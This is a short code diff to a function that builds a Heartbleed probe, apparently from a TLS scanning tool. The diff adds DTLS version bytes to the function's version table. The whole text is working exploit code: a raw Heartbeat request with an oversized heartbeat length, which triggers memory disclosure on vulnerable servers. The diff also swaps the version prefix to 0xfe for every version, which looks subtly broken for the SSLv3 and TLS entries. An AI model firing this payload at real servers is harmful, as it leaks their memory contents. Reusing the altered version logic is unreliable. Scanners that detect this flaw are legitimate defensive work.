@@ -107,12 +107,14 @@ def heartbleed_payload(ssl_version):
         OpenSslVersionEnum.SSLV3: b'\x00',  # Surprising that it works with SSL 3 which doesn't define TLS extensions
         OpenSslVersionEnum.TLSV1: b'\x01',
         OpenSslVersionEnum.TLSV1_1: b'\x02',
-        OpenSslVersionEnum.TLSV1_2: b'\x03'
+        OpenSslVersionEnum.TLSV1_2: b'\x03',
+        OpenSslVersionEnum.DTLSV1: b'\xff',
+        OpenSslVersionEnum.DTLSV1_2: b'\xfd',
     }
     ssl_version_bytes = SSL_VERSION_MAPPING[ssl_version]
 
     payload = b'\x18'                           # Record type - Heartbeat
-    payload += b'\x03' + ssl_version_bytes      # TLS version
+    payload += b'\xfe' + ssl_version_bytes      # TLS version
     payload += b'\x40\x00'                      # Record length
     payload += b'\x01'                          # Heartbeat type - Request
     payload += b'\x3f\xfd'                      # Heartbeat length
